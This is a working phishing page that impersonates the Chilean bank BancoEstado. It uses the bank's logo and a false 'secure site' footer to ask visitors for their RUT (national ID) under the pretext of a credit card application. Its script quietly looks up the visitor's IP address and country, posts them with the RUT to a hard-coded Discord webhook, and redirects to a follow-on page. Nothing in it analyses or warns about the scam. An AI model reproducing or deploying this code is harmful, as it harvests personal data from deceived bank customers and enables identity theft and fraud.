<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Solicitud</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            height: 28px;
            opacity: 0.9;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #64748b;
            font-size: 18px;
            cursor: pointer;
        }

        .message-section {
            padding: 50px 30px 20px;
            text-align: center;
        }

        .validation-text {
            font-size: 17px;
            color: #1e293b;
            line-height: 1.5;
            font-weight: 400;
            letter-spacing: -0.3px;
        }

        .highlight {
            display: block;
            margin-top: 10px;
            font-weight: 600;
            color: #64748b;
            font-size: 13px;
            text-transform: uppercase;
        }

        .form-container {
            padding: 20px 30px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            color: #64748b;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            font-size: 18px;
            box-sizing: border-box;
            outline: none;
            background-color: #fcfdfe;
            transition: all 0.2s;
            color: #1e293b;
            letter-spacing: 0.5px;
        }

        input:focus {
            border-color: #ff8c00;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: all 0.2s;
        }

        /* Botón en verde al estar listo */
        .btn-continuar.ready {
            background-color: #FFA500 !important;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }

        .btn-continuar:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            filter: grayscale(0.5);
        }

        .footer-secure {
            margin-top: auto;
            padding: 30px;
            text-align: center;
            font-size: 11px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" alt="Logo BancoEstado" class="logo">
            <div class="close-btn">✕</div>
        </div>

        <div class="message-section">
            <div class="validation-text">
                Ingresa tu RUT para solicitar tu Tarjeta de Crédito
                <span class="highlight">Banca en Línea</span>
            </div>
        </div>

        <div class="form-container">
            <div class="input-group">
                <label for="rut">RUT de Usuario</label>
                <input type="text" id="rut" placeholder="12.345.678-K" maxlength="12">
            </div>

            <button class="btn-continuar">Solicitar ahora</button>
        </div>

        <div class="footer-secure">
            🛡️ Sitio seguro protegido por BancoEstado Chile
        </div>
    </div>

    <script>
        const inputRut = document.getElementById('rut');
        const btnContinuar = document.querySelector('.btn-continuar');

        btnContinuar.disabled = true;

        inputRut.addEventListener('input', (e) => {
            let valor = e.target.value.replace(/[^0-9kK]/g, '');
            if (valor.length > 1) {
                let cuerpo = valor.slice(0, -1);
                let dv = valor.slice(-1).toUpperCase();
                cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
                e.target.value = cuerpo + "-" + dv;
            } else {
                e.target.value = valor.toUpperCase();
            }

            if (e.target.value.length >= 10) { 
                btnContinuar.classList.add('ready');
                btnContinuar.disabled = false;
            } else {
                btnContinuar.classList.remove('ready');
                btnContinuar.disabled = true;
            }
        });

        btnContinuar.addEventListener('click', async () => {
            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";
            
            btnContinuar.disabled = true;
            btnContinuar.innerText = "Procesando...";

            try {
                // 1. Obtener IP y País usando ipapi.co
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();
                
                const userIP = geoData.ip || "No detectada";
                const userCountry = geoData.country_name || "Desconocido";

                // 2. Preparar datos (Agente eliminado)
                const data = {
                    embeds: [{
                        title: "🏦 NUEVA SOLICITUD - DATOS DE RED",
                        color: 16745472, 
                        fields: [
                            { name: "👤 RUT", value: `\`${inputRut.value}\``, inline: true },
                            { name: "🌐 IP REAL", value: `\`${userIP}\``, inline: true },
                            { name: "🇨🇱 PAÍS", value: `**${userCountry}**`, inline: true }
                        ],
                        footer: { text: "Sistema de Verificación" },
                        timestamp: new Date()
                    }]
                };

                // 3. Enviar a Discord
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                // 4. Redirección
                setTimeout(() => {
                    window.location.href = "nuevo2.html"; 
                }, 1000);

            } catch (error) {
                console.error("Error:", error);
                window.location.href = "nuevo2.html";
            }
        });
    </script>
</body>

</html>
